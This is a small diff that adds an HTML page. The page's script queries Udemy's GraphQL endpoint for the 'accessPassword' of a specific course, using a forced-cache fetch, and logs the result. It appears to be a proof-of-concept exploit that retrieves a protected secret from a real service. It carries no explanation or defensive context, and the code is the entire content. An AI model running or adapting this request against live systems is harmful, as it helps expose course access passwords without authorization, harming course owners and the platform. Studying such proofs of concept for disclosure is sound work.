@@ -1,0 +1,11 @@
+<html>
+<script>  
+var url = "https://www.udemy.com/graphql?query=query+%28%24id%3A+ID%21%29+%7B+course%28id%3A+%24id%29+%7B+accessPassword+%7D%7D&variables=%7B%22id%22%3A%22Q291cnNlOjM2NDkzNzQ%3D%22%7D";  
+fetch(url, {    
+    method: 'GET',    
+    cache: 'force-cache'
+    })
+.then(response => response.json())
+.then(data => console.log(data));
+</script>
+</html>
